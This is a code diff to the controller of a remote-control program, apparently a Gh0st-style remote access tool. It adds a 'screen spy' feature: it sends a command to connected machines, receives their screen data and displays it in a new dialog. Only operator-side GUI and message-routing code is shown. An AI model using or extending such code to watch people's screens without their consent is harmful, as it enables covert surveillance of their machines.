@@ -10,6 +10,7 @@
 #include "CSettingDlg.h"
 #include "CShellDlg.h"
 #include "CSystemDlg.h"
+#include "CScreenSpyDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -151,6 +152,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
+	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
 
 END_MESSAGE_MAP()
 
@@ -176,7 +178,7 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, 
 		case NC_TRANSMIT:
 			break;
 		case NC_RECEIVE:
-			//ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
+			ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
 			break;
 		case NC_RECEIVE_COMPLETE:
 			ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
@@ -564,6 +566,8 @@ void CPCRemoteDlg::OnOnlineCmd()
 void CPCRemoteDlg::OnOnlineDesktop()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -789,9 +793,9 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	case FILEMANAGER_DLG:
 	//		((CFileManagerDlg*)dlg)->OnReceiveComplete();
 	//		break;
-	//	case SCREENSPY_DLG:
-	//		((CScreenSpyDlg*)dlg)->OnReceiveComplete();
-	//		break;
+		case SCREENSPY_DLG:
+			((CScreenSpyDlg*)dlg)->OnReceiveComplete();
+			break;
 	//	case WEBCAM_DLG:
 	//		((CWebCamDlg*)dlg)->OnReceiveComplete();
 	//		break;
@@ -848,10 +852,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
 	//	g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 	//	break;
-	//case TOKEN_BITMAPINFO: //
-	//	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
-	//	g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
-	//	break;
+	case TOKEN_BITMAPINFO: //
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+		g_PCRemote->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+		break;
 	//case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 	//	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 	//	break;
@@ -1080,6 +1084,49 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	catch (...) {}
 	return 0;
 }
+LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext* pContext = (ClientContext*)lParam;
+
+	CScreenSpyDlg* dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SCREENSPY_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
 
 
 
+
+
+void CPCRemoteDlg::ProcessReceive(ClientContext* pContext)
+{
+	// TODO: 在此处添加实现代码.
+	if (pContext == NULL)
+		return;
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];
+
+	// 交给窗口处理
+	if (pContext->m_Dialog[0] > 0)
+	{
+		switch (pContext->m_Dialog[0])
+		{
+		case SCREENSPY_DLG:
+			((CScreenSpyDlg*)dlg)->OnReceive();
+			break;
+		case WEBCAM_DLG:
+			//((CWebCamDlg*)dlg)->OnReceive();
+			break;
+		case AUDIO_DLG:
+			//((CAudioDlg*)dlg)->OnReceive();
+			break;
+		default:
+			break;
+		}
+		return;
+	}
+}
